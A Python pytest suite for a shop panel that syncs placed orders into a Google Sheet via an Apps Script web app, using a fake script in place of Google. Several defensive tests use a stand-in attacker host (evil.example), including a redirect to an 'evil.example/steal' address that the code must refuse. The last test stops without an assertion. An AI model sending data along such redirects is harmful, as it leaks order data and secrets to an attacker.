"""The owner's Google table of orders, sheet «Заказы» (the owner 2026-10-23): rows of the placed orders, written by the web app of Apps
Script, kept up to date, never twice. A fake web app only: no request leaves the tests."""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest
from cryptography.fernet import Fernet

from panel_helpers import make_app, post, shared_mark_of
from test_roles import person, sign_in
from test_webmim_create import NOW, card, db, point
from tires_sync import connections, order_report, order_sheet as sheet, order_templates as templates, orders, store, users
from tires_sync.secretbox import SecretBox

URL = "https://script.google.com/macros/s/AKfycbTEST_1234567890abc/exec"
SECRET = "s3cret-XYZ-1234567890"
LATER = "2026-10-23T12:30:00"


class FakeScript:
    """The web app of docs/integrations/google-sheet-apps-script.md: rows found by their hidden mark, the answer behind a redirect.
    `fail`: what the next POSTs do instead ("timeout", "500", "html")."""

    def __init__(self, columns=sheet.COLUMNS, secret=SECRET):
        self.columns, self.secret = list(columns), secret
        self.rows, self.posts, self.fail, self.result = {}, [], [], None

    def __call__(self, method, url, headers, body):
        if method == "POST":
            assert url == URL and "secret" not in url
            payload = json.loads(body.decode("utf-8"))
            self.posts.append(payload)
            action = self.fail.pop(0) if self.fail else None
            if action == "timeout":
                raise OSError("timed out")
            if action == "500":
                return 500, {}, b""
            if action == "html":
                return 200, {"content-type": "text/html"}, "<html>Войдите в аккаунт Google</html>".encode("utf-8")
            self.result = self.run(payload)
            return 302, {"location": "https://script.googleusercontent.com/macros/echo?user_content_key=k1"}, b""
        assert method == "GET" and url.startswith("https://script.googleusercontent.com/")
        return 200, {"content-type": "application/json"}, json.dumps(self.result, ensure_ascii=False).encode("utf-8")

    def run(self, p):
        if p.get("secret") != self.secret:
            return {"ok": False, "error": "неверный секрет"}
        if p.get("ping"):
            return {"ok": True, "missing": [c for c in p["columns"] if c not in self.columns]}
        out = []
        for row in p["rows"]:
            lacking = [c for c in row["fields"] if c not in self.columns]
            if lacking:
                out.append({"key": row["key"], "status": "error", "error": "нет колонок: " + ", ".join(lacking)})
                continue
            if row["key"] in self.rows and row.get("check") and any(self.rows[row["key"]].get(c) != v for c, v in row["check"].items()):
                out.append({"key": row["key"], "status": "missing"})                # rewritten by hand: not touched
                continue
            if row["key"] not in self.rows:
                if not row["create"]:
                    out.append({"key": row["key"], "status": "missing"})
                    continue
                self.rows[row["key"]] = {}
                status = "created"
            else:
                status = "updated"
            self.rows[row["key"]].update(row["fields"])
            out.append({"key": row["key"], "status": status})
        return {"ok": True, "results": out}

    def data_posts(self):
        return [p for p in self.posts if "rows" in p]


def turn_on(conn, box, url=URL):
    sheet.save_settings(conn, url, True, NOW, "owner", secret_typed=True)
    connections.set_secret(conn, box, sheet.KIND, 0, "secret", SECRET, NOW, "owner")
    conn.commit()


def stage(conn, code):
    return next(s for s in orders.list_stages(conn) if s["code"] == code)


def placed(conn, **kw):
    mine = card(conn, **kw)
    orders.move_card(conn, mine, stage(conn, "placed")["id"], NOW, "owner")
    return mine


def events(conn, mine):
    return [e["text"] for e in reversed(orders.list_events(conn, mine)) if e["author"] == sheet.AUTHOR]        # the oldest first


@pytest.fixture
def table(tmp_path):
    conn = db(tmp_path)
    box = SecretBox(Fernet.generate_key())
    turn_on(conn, box)
    return conn, box, FakeScript()


# ---- which orders ---------------------------------------------------------------------------------------------------------------------

def test_an_order_joins_when_placed_while_the_table_is_on_and_never_before(tmp_path):
    conn = db(tmp_path)
    box = SecretBox(Fernet.generate_key())
    before = placed(conn)                                                  # placed before the table was switched on: never
    turn_on(conn, box)
    mine = placed(conn, client_name="Пётр")
    skipped = card(conn, client_name="Олег")
    orders.move_card(conn, skipped, stage(conn, "at_point")["id"], NOW, "owner")            # «Заказ оформлен» jumped over: placed all the same
    cancelled = card(conn, client_name="Анна")
    orders.move_card(conn, cancelled, stage(conn, "cancel")["id"], NOW, "owner", {"cancel_reason": "передумал"})
    queued = {r[0] for r in conn.execute("SELECT order_id FROM sheet_order")}
    assert queued == {mine, skipped}
    orders.move_card(conn, mine, stage(conn, "at_point")["id"], LATER, "owner")
    assert conn.execute("SELECT placed_at FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()[0] == NOW      # the first placing stays
    for code in ("at_point", "done"):                                      # placed before the table, moved on after it: never
        orders.move_card(conn, before, stage(conn, code)["id"], LATER, "owner")
    assert conn.execute("SELECT 1 FROM sheet_order WHERE order_id = ?", (before,)).fetchone() is None
    sheet.save_settings(conn, URL, False, NOW, "owner")
    other = placed(conn, client_name="Ира")
    assert conn.execute("SELECT 1 FROM sheet_order WHERE order_id = ?", (other,)).fetchone() is None and before not in queued


def test_the_settings_take_only_an_address_of_apps_script(tmp_path):
    conn = db(tmp_path)
    for bad in ("http://script.google.com/macros/s/AKfycbTEST_1234567890abc/exec", "https://evil.example/macros/s/AKfycbTEST_1234567890abc/exec",
                "https://script.google.com/macros/s/AKfycbTEST_1234567890abc/exec?x=1", "https://script.google.com.evil.example/macros/s/AKfycbTEST_1/exec"):
        with pytest.raises(sheet.SheetError):
            sheet.save_settings(conn, bad, True, NOW, "owner")
    with pytest.raises(sheet.SheetError):
        sheet.save_settings(conn, "", True, NOW, "owner")
    with pytest.raises(sheet.SheetError):
        sheet.save_settings(conn, "https://script.google.com/a/macros/evil.example/x/s/AKfycbTEST_1234567890abc/exec", True, NOW, "owner")
    sheet.save_settings(conn, "https://script.google.com/a/macros/example.com/s/AKfycbTEST_1234567890abc/exec", True, NOW, "owner")
    sheet.save_settings(conn, URL, True, NOW, "owner")
    assert sheet.settings(conn) == {"url": URL, "enabled": True, "since": NOW, "secret_for": ""}
    sheet.save_settings(conn, URL, True, LATER, "owner")
    assert sheet.settings(conn)["since"] == NOW                                                 # saved again: still on since the first time


# ---- the rows -------------------------------------------------------------------------------------------------------------------------

def test_a_row_per_position_with_every_column(table):
    conn, box, fake = table
    mine = placed(conn, goods=(("111", 4), ("111", 1)), comment="Хочу сегодня")                 # one code twice: two rows
    orders.update_card(conn, mine, {"webmim_number": "1234567", "transfer_number": "26R-922352"}, NOW, "owner")
    rows = sheet.rows_of(conn, mine, NOW)
    items = orders.get_card(conn, mine)["items"]
    assert list(rows) == [sheet.key(mine, i["id"]) for i in items] and len(rows) == 2
    first = rows[sheet.key(mine, items[0]["id"])]
    assert set(first) == set(sheet.COLUMNS)
    assert first == dict(first, **{"Дата": "2026-10-23", "№ заказа MIM": "1234567", "Перемещение MIM": "26R-922352", "Артикул": "111",
                                   "Наименование": "Шина 111", "Кол-во": 4, "Цена MIM": 4000.0, "Сумма MIM": 16000.0, "Цена продажи": 5000.0,
                                   "Сумма продажи": 20000.0, "Имя": "Иван", "Телефон": "+7 911 111-22-33", "ПВЗ": "Гамма", "Этап": "Заказ оформлен",
                                   "Реализация": "", "Списание": False, "Прибыль %": "", "Прибыль ₽": "", "Уведомление точке": "",
                                   "Уведомление клиенту": "", "Примечание": "Хочу сегодня"})
    assert rows[sheet.key(mine, items[1]["id"])]["Кол-во"] == 1


@pytest.mark.parametrize("code, kind, letter", [("placed", "webmim", ""), ("at_point", "webmim", ""), ("done", "webmim", "Р"), ("done", "stock", "Б"),
                                                ("cancel", "webmim", "О"), ("return", "webmim", "О"), ("oth", "webmim", "О")])
def test_realization_follows_the_legend(table, code, kind, letter):
    conn, box, fake = table
    mine = placed(conn, deal_kind=kind)
    changes = {"cancel_reason": "отказ"} if code == "cancel" else {"return_kind": "client", "return_reason": "не подошли", "return_amount": "100"} if code == "return" else None
    orders.move_card(conn, mine, stage(conn, code)["id"], NOW, "owner", changes)
    assert {r["Реализация"] for r in sheet.rows_of(conn, mine, NOW).values()} == {letter}


def test_the_profit_is_the_analytics_one_and_the_rows_add_up_to_the_net(table):
    conn, box, fake = table
    mine = placed(conn, goods=(("111", 4), ("222", 2)))
    orders.move_card(conn, mine, stage(conn, "done")["id"], NOW, "owner")
    assert {r["Прибыль ₽"] for r in sheet.rows_of(conn, mine, NOW).values()} == {""}                  # no sale written: no profit
    orders.record_sales(conn, mine, "2026-10-23", NOW, "owner", "2026-10-23")
    rows = list(sheet.rows_of(conn, mine, NOW).values())
    report = order_report.build(conn, "2026-10-23", "2026-10-23")
    assert round(sum(r["Прибыль ₽"] for r in rows), 2) == report["total"]["net"] and report["total"]["fee"] == 75.0
    for r in rows:
        assert r["Прибыль %"] == round(r["Прибыль ₽"] * 100.0 / r["Сумма продажи"], 1)
    assert rows[0]["Прибыль ₽"] != rows[1]["Прибыль ₽"]                                               # the fee is shared by the sum of the sale
    orders.reverse_sales(conn, mine, NOW, "owner")
    assert {r["Прибыль ₽"] for r in sheet.rows_of(conn, mine, NOW).values()} == {""}


def test_the_notices_are_the_time_the_last_message_went(table):
    conn, box, fake = table
    templates.add_samples(conn)
    mine = placed(conn)
    ids = {t["name"]: t["id"] for t in templates.list_templates(conn)}
    def task(name, status, done_at, entered):
        conn.execute("INSERT INTO order_task (order_id, rule_id, entered_at, kind, arg, status, title, created_at, done_at) VALUES (?, 0, ?, 'message', ?, ?, ?, ?, ?)",
                     (mine, entered, str(ids[name]), status, name, NOW, done_at))
    task("Клиенту: заказ оформлен", "done", "2026-10-23T14:05:00", "a")
    task("Менеджеру: заказ оформлен", "skipped", "2026-10-23T14:06:00", "b")
    conn.commit()
    row = next(iter(sheet.rows_of(conn, mine, NOW).values()))
    assert row["Уведомление клиенту"] == "23.10.2026 14:05" and row["Уведомление точке"] == ""
    task("Менеджеру: заказ оформлен", "done", "2026-10-23T15:10:00", "c")
    conn.commit()
    assert next(iter(sheet.rows_of(conn, mine, NOW).values()))["Уведомление точке"] == "23.10.2026 15:10"


def test_the_invoice_day_is_the_day_of_the_webmim_order(table):
    conn, box, fake = table
    mine = placed(conn)
    assert next(iter(sheet.rows_of(conn, mine, NOW).values()))["Дата счета"] == ""
    conn.execute("INSERT INTO webmim_create (order_id, server, state, first_at, started_at, author, webmim_id, updated_at) VALUES (?, 'test', 'done', ?, ?, 'owner', '1001', '2026-10-22T18:00:00')",
                 (mine, NOW, NOW))
    assert next(iter(sheet.rows_of(conn, mine, NOW).values()))["Дата счета"] == "2026-10-22"                 # the moment the button made it
    conn.execute("INSERT INTO webmim_order (server, id, number, create_date, seen_at) VALUES ('test', '1001', '5001', '2026-10-21T11:00:00', ?)", (NOW,))
    assert next(iter(sheet.rows_of(conn, mine, NOW).values()))["Дата счета"] == "2026-10-21"                 # WebMIM's own date


def test_the_codes_written_off_are_the_tick(table):
    conn, box, fake = table
    mine = placed(conn)
    orders.update_card(conn, mine, {"codes_written_off_at": "2026-10-23"}, NOW, "owner")
    assert {r["Списание"] for r in sheet.rows_of(conn, mine, NOW).values()} == {True}


# ---- sending --------------------------------------------------------------------------------------------------------------------------

def test_the_first_send_makes_the_rows_and_a_second_look_sends_nothing(table):
    conn, box, fake = table
    mine = placed(conn)
    assert sheet.flush(conn, box, fake, NOW)
    assert len(fake.rows) == 2 and all(set(r) == set(sheet.COLUMNS) for r in fake.rows.values())
    sent = fake.data_posts()[0]
    assert sent["secret"] == SECRET and sent["sheet"] == "Заказы" and all(r["create"] for r in sent["rows"])
    assert events(conn, mine) == ["Записано в Google-таблицу: 2 стр."]
    assert sheet.flush(conn, box, fake, LATER) == {} and sheet.flush(conn, box, fake, LATER, full=True) == {mine: "нечего отправлять"}
    assert len(fake.data_posts()) == 1


def test_a_change_sends_only_the_columns_that_follow_the_order(table):
    conn, box, fake = table
    mine = placed(conn, comment="Хочу сегодня")
    sheet.flush(conn, box, fake, NOW)
    orders.update_card(conn, mine, {"transfer_number": "26R-1", "client_name": "Иван Петров", "comment": "Сам доставил"}, LATER, "pavel")
    orders.move_card(conn, mine, stage(conn, "at_point")["id"], LATER, "pavel")
    sheet.flush(conn, box, fake, LATER)
    update = fake.data_posts()[-1]["rows"]
    assert len(update) == 2 and not any(r["create"] for r in update) and all(set(r["fields"]) == {"Перемещение MIM", "Этап"} for r in update)
    row = next(iter(fake.rows.values()))
    assert row["Имя"] == "Иван" and row["Примечание"] == "Хочу сегодня" and row["Этап"] == "Товар на точке" and row["Перемещение MIM"] == "26R-1"
    assert events(conn, mine)[-1] == "Google-таблица обновлена: Перемещение MIM, Этап."


def test_a_position_added_after_placing_is_a_new_row_and_a_removed_one_is_said(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    items = orders.get_card(conn, mine)["items"]
    orders.add_item(conn, mine, goods_id="333", name="Шина 333", brand_key="b", season="summer", diameter=16, territory="t", qty=2, sale_unit=6000,
                    supplier_price=5000, terms=None, fee_pct=0, promo_pct=0, now=LATER, author="pavel")
    orders.remove_item(conn, items[1]["id"], LATER, "pavel")
    conn.commit()
    sheet.flush(conn, box, fake, LATER)
    last = fake.data_posts()[-1]["rows"]
    assert [r["create"] for r in last] == [True] and last[0]["fields"]["Артикул"] == "333" and len(fake.rows) == 3
    assert "Позиция убрана из заказа: её строку в Google-таблице поправьте вручную." in events(conn, mine)
    sheet.flush(conn, box, fake, "2026-10-23T13:00:00", full=True)
    assert events(conn, mine).count("Позиция убрана из заказа: её строку в Google-таблице поправьте вручную.") == 1


def test_a_failure_is_said_once_and_retried_later_without_a_double(table):
    conn, box, fake = table
    mine = placed(conn)
    fake.fail = ["timeout", "500", "html"]
    assert "ошибка" in sheet.flush(conn, box, fake, NOW)[mine]
    assert events(conn, mine) == ["Ошибка Google-таблицы: Google не ответил (OSError): повторим позже."]
    row = conn.execute("SELECT failing, next_at FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()
    assert row == (1, "2026-10-23T12:01:00")
    assert sheet.flush(conn, box, fake, "2026-10-23T12:00:30") == {} and len(fake.posts) == 1                   # not before its time
    sheet.flush(conn, box, fake, "2026-10-23T12:01:00")                                                         # 500
    sheet.flush(conn, box, fake, "2026-10-23T12:06:00")                                                         # a page of Google, not the script
    assert conn.execute("SELECT failing, next_at FROM sheet_order WHERE order_id = ?", (mine,)).fetchone() == (3, "2026-10-23T12:21:00")
    assert len(events(conn, mine)) == 1                                                                       # once per streak
    assert "страница Google" in conn.execute("SELECT error FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()[0]
    sheet.flush(conn, box, fake, "2026-10-23T12:21:00")
    assert len(fake.rows) == 2 and events(conn, mine)[-1] == "Записано в Google-таблицу: 2 стр."
    assert conn.execute("SELECT failing, next_at, error FROM sheet_order WHERE order_id = ?", (mine,)).fetchone() == (0, "", "")


def test_an_answer_lost_after_the_rows_were_made_makes_no_double(table):
    conn, box, fake = table
    mine = placed(conn)
    real = fake.__call__
    def lost(method, url, headers, body):
        answer = real(method, url, headers, body)
        if method == "GET" and len(fake.data_posts()) == 1:
            raise OSError("timed out")                                    # the script wrote the rows, the panel never heard it
        return answer
    sheet.flush(conn, box, lost, NOW)
    assert len(fake.rows) == 2 and "Ошибка Google-таблицы" in events(conn, mine)[0]
    sheet.flush(conn, box, lost, "2026-10-23T12:01:00")
    assert len(fake.rows) == 2 and all(r["create"] for r in fake.data_posts()[-1]["rows"])                 # sent again: the mark finds the rows
    assert events(conn, mine)[-1] == "Записано в Google-таблицу: 2 стр."


def test_a_row_the_owner_deleted_is_not_made_again(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    gone = sorted(fake.rows)[0]
    del fake.rows[gone]
    orders.move_card(conn, mine, stage(conn, "at_point")["id"], LATER, "pavel")
    sheet.flush(conn, box, fake, LATER)
    assert gone not in fake.rows and len(fake.rows) == 1
    assert any("Строка Google-таблицы изменена или удалена вручную (другой артикул или строки нет): 1 стр." in e for e in events(conn, mine))
    orders.move_card(conn, mine, stage(conn, "done")["id"], "2026-10-23T13:00:00", "pavel")
    sheet.flush(conn, box, fake, "2026-10-23T13:00:00")
    assert [r["key"] for r in fake.data_posts()[-1]["rows"]] == [k for k in fake.rows] and gone not in fake.rows


def test_a_missing_column_or_a_wrong_secret_is_said_and_retried(table):
    conn, box, fake = table
    mine = placed(conn)
    fake.columns.remove("Списание")
    sheet.flush(conn, box, fake, NOW)
    assert fake.rows == {} and events(conn, mine) == ["Google-таблица не приняла 2 стр. (нет колонок: Списание): отправим ещё раз."]
    fake.columns.append("Списание")
    fake.secret = "другой"
    sheet.flush(conn, box, fake, "2026-10-23T12:01:00")
    assert len(events(conn, mine)) == 1                                                                         # still the same streak
    assert conn.execute("SELECT error FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()[0] == "Скрипт отказал: неверный секрет"
    fake.secret = SECRET
    sheet.flush(conn, box, fake, "2026-10-23T12:06:00")
    assert len(fake.rows) == 2


def test_a_redirect_elsewhere_is_refused(table):
    conn, box, fake = table
    placed(conn)
    def evil(method, url, headers, body):
        if method == "POST":
            return 302, {"location": "https://evil.example/steal"}, b""
        raise AssertionError("never followed")
    assert "переадресовал" in next(iter(sheet.flush(conn, box, evil, NOW).values()))


def test_an_order_being_sent_is_not_taken_twice(table):
    conn, box, fake = table
    mine = placed(conn)
    assert sheet._claim(conn, mine, NOW)                                    # another process took it a moment ago
    assert not sheet._claim(conn, mine, NOW)
    assert sheet.flush(conn, box, fake, "2026-10-23T12:01:00") == {} and fake.posts == []
    assert sheet.flush(conn, box, fake, "2026-10-23T12:04:00")                                               # its claim ran out: taken
    assert conn.execute("SELECT claim_until FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()[0] == ""


def test_nothing_goes_when_off_or_without_a_secret(tmp_path):
    conn = db(tmp_path)
    box = SecretBox(Fernet.generate_key())
    sheet.save_settings(conn, URL, True, NOW, "owner")
    placed(conn)
    fake = FakeScript()
    assert sheet.flush(conn, box, fake, NOW) == {} and fake.posts == []                                    # no secret
    connections.set_secret(conn, box, sheet.KIND, 0, "secret", SECRET, NOW, "owner")
    sheet.save_settings(conn, URL, False, NOW, "owner")
    assert sheet.flush(conn, box, fake, NOW) == {} and sheet.flush(conn, None, fake, NOW) == {} and fake.posts == []


def test_the_check_says_what_the_sheet_lacks(table):
    conn, box, fake = table
    assert sheet.check(conn, box, fake) == "Таблица отвечает: лист «Заказы», все колонки на месте."
    fake.columns = [c for c in fake.columns if c not in ("Прибыль %", "ПВЗ")]
    with pytest.raises(sheet.SheetError, match="нет колонок: ПВЗ, Прибыль %"):
        sheet.check(conn, box, fake)


# ---- the panel ------------------------------------------------------------------------------------------------------------------------

@pytest.fixture
def panel(tmp_path, monkeypatch):
    monkeypatch.setattr(users, "HASH_METHOD", "pbkdf2:sha256:1000")
    box, fake = SecretBox(Fernet.generate_key()), FakeScript()
    app = make_app(tmp_path, SECRET_BOX=box, SHEET_HTTP=fake, SHEET_RUN=lambda work: work())
    conn = store.connect(app.config["DB_PATH"])
    orders.ensure_pipeline(conn, NOW)
    conn.commit()
    client = app.test_client()
    with client.session_transaction() as session:
        session["user"], session["epoch"], session["csrf"] = "owner", 0, "tok"
        session["pw"] = shared_mark_of(client.application)
    return app, conn, box, fake, client


def test_the_tab_saves_the_address_and_an_encrypted_secret_and_checks(panel):
    app, conn, box, fake, client = panel
    page = client.get("/connections/sheet").get_data(as_text=True)
    assert 'href="/connections/sheet" class="is-active"' in page and "Google-таблица заказов" in page and "не задан" in page
    r = client.post("/connections/sheet", data={"csrf": "tok", "url": URL, "secret": SECRET, "enabled": "1"})
    assert r.status_code == 302
    assert sheet.settings(conn)["enabled"] and connections.get_secret(conn, box, sheet.KIND, 0, "secret") == SECRET
    stored = conn.execute("SELECT ciphertext FROM secret WHERE kind = ?", (sheet.KIND,)).fetchone()[0]
    assert SECRET not in str(stored)
    page = client.get("/connections/sheet").get_data(as_text=True)
    assert SECRET not in page and "задан (" in page and URL in page
    post(client, "/connections/sheet/check", "tok")
    assert connections.get_check(conn, sheet.KIND, 0)["status"] == "ok: Таблица отвечает: лист «Заказы», все колонки на месте."
    audit = " ".join(str(r) for r in conn.execute("SELECT * FROM audit"))
    assert SECRET not in audit
    client.post("/connections/sheet", data={"csrf": "tok", "url": "https://evil.example/x", "secret": "", "enabled": "1"})
    assert sheet.settings(conn)["url"] == URL                                                             # a wrong address is not saved


def test_only_the_rights_of_connections_reach_the_tab(panel):
    app, conn, box, fake, client = panel
    pid = point(conn)
    conn.commit()
    partner, _ = person(app, "partner")                                    # «Настройка» to look at, no right «connections»
    assert partner.get("/connections/sheet").status_code == 200
    assert partner.post("/connections/sheet", data={"csrf": "tok", "url": URL, "enabled": "1"}).status_code == 403
    assert partner.post("/connections/sheet/check", data={"csrf": "tok"}).status_code == 403
    viewer, _ = person(app, "viewer")
    assert viewer.get("/connections/sheet").status_code == 403
    manager, _ = person(app, "point", point_id=pid)
    assert manager.get("/connections/sheet").status_code in (302, 403)
    assert sheet.settings(conn)["url"] == ""


def test_a_move_in_the_panel_sends_the_rows_after_the_answer(panel):
    app, conn, box, fake, client = panel
    turn_on(conn, box)
    mine = card(conn)
    post(client, "/orders/%d/move" % mine, "tok", stage_id=str(stage(conn, "placed")["id"]))
    assert orders.get_card(conn, mine)["stage"]["code"] == "placed" and len(fake.rows) == 2
    assert events(conn, mine) == ["Записано в Google-таблицу: 2 стр."]


def test_the_tick_of_the_window_marks_the_codes_and_the_table_follows(panel):
    app, conn, box, fake, client = panel
    turn_on(conn, box)
    mine = card(conn)
    orders.move_card(conn, mine, stage(conn, "placed")["id"], NOW, "owner")
    page = client.get("/orders/%d" % mine).get_data(as_text=True)
    assert 'name="codes_written_off" value="1">' in page and 'name="codes_written_off_was" value="0"' in page
    post(client, "/orders/%d/save" % mine, "tok", codes_written_off="1", codes_written_off_was="0")
    assert orders.get_card(conn, mine)["codes_written_off_at"] == "2026-10-07"                     # the panel's day (panel_helpers' clock)
    assert all(r["Списание"] is True for r in fake.rows.values())
    post(client, "/orders/%d/save" % mine, "tok", codes_written_off_was="0")                          # a page that showed it off: no change
    assert orders.get_card(conn, mine)["codes_written_off_at"] == "2026-10-07"
    post(client, "/orders/%d/save" % mine, "tok", codes_written_off_was="1")                          # taken off
    assert orders.get_card(conn, mine)["codes_written_off_at"] == ""
    assert all(r["Списание"] is False for r in fake.rows.values())
    assert "Google-таблица обновлена: Списание." in events(conn, mine)


# ---- the script of the owner ----------------------------------------------------------------------------------------------------------

# the script is the owner's and stays private: in docs/ now, in private/docs/ once the code is open; a copy without it skips these tests,
# unless TIRES_REQUIRE_PRIVATE_DOCS=1 (the owner's runner, .github/workflows/tests.yml): there a missing script fails them
DOCS = [Path(__file__).resolve().parent.parent / d / "integrations" / "google-sheet-apps-script.md" for d in ("docs", "private/docs")]
REQUIRE_ENV = "TIRES_REQUIRE_PRIVATE_DOCS"


def doc_text(docs=None):
    found = [p for p in (DOCS if docs is None else docs) if p.exists()]
    if not found:
        why = "the owner's Apps Script is private (docs/ or private/docs/), not in this copy"
        if os.environ.get(REQUIRE_ENV) == "1":
            pytest.fail(f"{why}, and {REQUIRE_ENV}=1 says it must be here")
        pytest.skip(why)
    return found[0].read_text(encoding="utf-8")


def test_a_missing_script_skips_in_a_public_copy_and_fails_where_it_is_required(tmp_path, monkeypatch):
    nowhere = [tmp_path / "docs" / "x.md", tmp_path / "private" / "docs" / "x.md"]
    monkeypatch.delenv(REQUIRE_ENV, raising=False)
    with pytest.raises(pytest.skip.Exception):
        doc_text(nowhere)
    monkeypatch.setenv(REQUIRE_ENV, "0")
    with pytest.raises(pytest.skip.Exception):
        doc_text(nowhere)
    monkeypatch.setenv(REQUIRE_ENV, "1")
    with pytest.raises(pytest.fail.Exception, match=REQUIRE_ENV):
        doc_text(nowhere)
    nowhere[1].parent.mkdir(parents=True)
    nowhere[1].write_text("скрипт", encoding="utf-8")                  # private/docs/ is enough once the code is open
    assert doc_text(nowhere) == "скрипт"


def script_text():
    text = doc_text()
    return re.search(r"```javascript\n(.*?)```", text, re.S).group(1)


def test_the_script_knows_the_columns_of_the_panel():
    code = script_text()
    for name in re.findall(r"'([^']+)'", re.search(r"var DAYS = \[(.*?)\];", code).group(1)) + ["Списание", "Дата"]:
        assert name in sheet.COLUMNS, name
    assert "body.secret !== secret" in code and "LockService" in code and "row.create" in code and "typeof value === 'string'" in code
    doc = doc_text()
    for name in sheet.COLUMNS:
        assert name in doc, name


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_the_script_is_valid_javascript(tmp_path):
    path = tmp_path / "Code.js"
    path.write_text(script_text(), encoding="utf-8")
    subprocess.run(["node", "--check", str(path)], check=True, capture_output=True)


def test_the_webmim_button_puts_the_order_in_the_table(tmp_path, monkeypatch):
    from test_order_placed import panel as placed_panel, ready
    app, conn, webmim, avito, box, client = placed_panel.__wrapped__(tmp_path, monkeypatch)
    fake = FakeScript()
    app.config.update(SHEET_HTTP=fake, SHEET_RUN=lambda work: work())
    turn_on(conn, box)
    mine = ready(conn, chat=False)
    assert post(client, "/orders/%d/webmim/create" % mine, "tok").status_code == 302
    assert orders.get_card(conn, mine)["webmim_id"] and conn.execute("SELECT 1 FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()
    assert len(fake.rows) == 2 and {r["№ заказа MIM"] for r in fake.rows.values()} == {orders.get_card(conn, mine)["webmim_number"] or orders.get_card(conn, mine)["webmim_id"]}
    assert "Записано в Google-таблицу: 2 стр." in events(conn, mine)


def test_an_update_carries_the_cells_that_identify_the_row_and_a_rewritten_row_is_left_alone(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    first = sorted(fake.rows)[0]
    fake.rows[first]["Артикул"] = "чужой"                                   # the owner wrote another tyre into the row
    orders.move_card(conn, mine, stage(conn, "at_point")["id"], LATER, "pavel")
    sheet.flush(conn, box, fake, LATER)
    sent = fake.data_posts()[-1]["rows"]
    assert [r["check"] for r in sent] == [{"Артикул": "111"}, {"Артикул": "222"}]          # the code alone (the tech lead 2026-10-23)
    assert fake.rows[first]["Этап"] == "Заказ оформлен" and fake.rows[sorted(fake.rows)[1]]["Этап"] == "Товар на точке"
    assert any("Строка Google-таблицы изменена или удалена вручную" in e for e in events(conn, mine))


def test_a_name_the_owner_corrected_keeps_the_row_up_to_date(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    for row in fake.rows.values():
        row["Наименование"] = "Шина (поправил владелец)"
    orders.move_card(conn, mine, stage(conn, "at_point")["id"], LATER, "pavel")
    sheet.flush(conn, box, fake, LATER)
    assert {r["Этап"] for r in fake.rows.values()} == {"Товар на точке"}
    assert {r["Наименование"] for r in fake.rows.values()} == {"Шина (поправил владелец)"}          # written once: the correction stays


def test_one_broken_order_does_not_stop_the_others(table, monkeypatch):
    conn, box, fake = table
    broken, fine = placed(conn), placed(conn, client_name="Пётр")
    real = sheet.rows_of
    def rows_of(conn_, card_id, placed_at):
        if card_id == broken:
            raise KeyError("сломано")
        return real(conn_, card_id, placed_at)
    monkeypatch.setattr(sheet, "rows_of", rows_of)
    done = sheet.flush(conn, box, fake, NOW)
    assert done[broken].startswith("ошибка: сбой панели (KeyError)") and "Записано" in done[fine]
    assert conn.execute("SELECT failing, next_at FROM sheet_order WHERE order_id = ?", (broken,)).fetchone() == (1, "2026-10-23T12:01:00")
    assert events(conn, broken) == ["Ошибка Google-таблицы: сбой панели (KeyError): сообщите разработчику."]


def test_the_hourly_look_skips_old_orders_but_not_failing_ones(table):
    conn, box, fake = table
    old, failing, fresh = placed(conn), placed(conn, client_name="Б"), placed(conn, client_name="В")
    sheet.flush(conn, box, fake, NOW)
    conn.execute("UPDATE sheet_order SET placed_at = '2026-09-01T10:00:00' WHERE order_id IN (?, ?)", (old, failing))
    conn.execute("UPDATE sheet_order SET failing = 1 WHERE order_id = ?", (failing,))
    conn.commit()
    assert set(sheet.flush(conn, box, fake, LATER, full=True)) == {failing, fresh}


def test_a_change_made_while_google_answers_goes_with_the_next_send(table):
    conn, box, fake = table
    mine = placed(conn)
    other = store.connect(conn.execute("PRAGMA database_list").fetchone()[2])
    real = fake.__call__
    def slow(method, url, headers, body):
        if method == "POST" and len(fake.data_posts()) == 0:
            orders.move_card(other, mine, stage(conn, "at_point")["id"], NOW, "pavel")      # a manager moves it during the send
        return real(method, url, headers, body)
    sheet.flush(conn, box, slow, NOW)
    assert {r["Этап"] for r in fake.rows.values()} == {"Заказ оформлен"}
    sheet.flush(conn, box, fake, LATER)                                     # the next kick, not the hourly look
    assert {r["Этап"] for r in fake.rows.values()} == {"Товар на точке"}


def test_a_new_address_wants_the_secret_again(panel):
    app, conn, box, fake, client = panel
    turn_on(conn, box)
    other = "https://script.google.com/macros/s/AKfycbOTHER_0987654321xyz/exec"
    client.post("/connections/sheet", data={"csrf": "tok", "url": other, "secret": "", "enabled": "1"})
    assert sheet.settings(conn)["url"] == URL
    client.post("/connections/sheet", data={"csrf": "tok", "url": other, "secret": "новый-секрет-1234567890", "enabled": "1"})
    assert sheet.settings(conn)["url"] == other and connections.get_secret(conn, box, sheet.KIND, 0, "secret") == "новый-секрет-1234567890"
    client.post("/connections/sheet", data={"csrf": "tok", "url": other, "secret": "", "enabled": ""})       # the same address: the secret stays
    assert not sheet.settings(conn)["enabled"] and connections.get_secret(conn, box, sheet.KIND, 0, "secret") == "новый-секрет-1234567890"
    client.post("/connections/sheet", data={"csrf": "tok", "url": "", "secret": "", "enabled": ""})          # cleared, then a third address
    assert sheet.settings(conn)["url"] == ""
    third = "https://script.google.com/macros/s/AKfycbTHIRD_1111111111aaa/exec"
    client.post("/connections/sheet", data={"csrf": "tok", "url": third, "secret": "", "enabled": "1"})
    assert sheet.settings(conn)["url"] == ""                                                               # still wants the secret


def test_the_secret_goes_only_to_the_address_it_was_typed_for(table):
    conn, box, fake = table
    placed(conn)
    config = dict(sheet.settings(conn), url="https://script.google.com/macros/s/AKfycbOTHER_0987654321xyz/exec")
    connections.set_config(conn, sheet.KIND, 0, config, NOW, "owner")                     # however the address changed
    conn.commit()
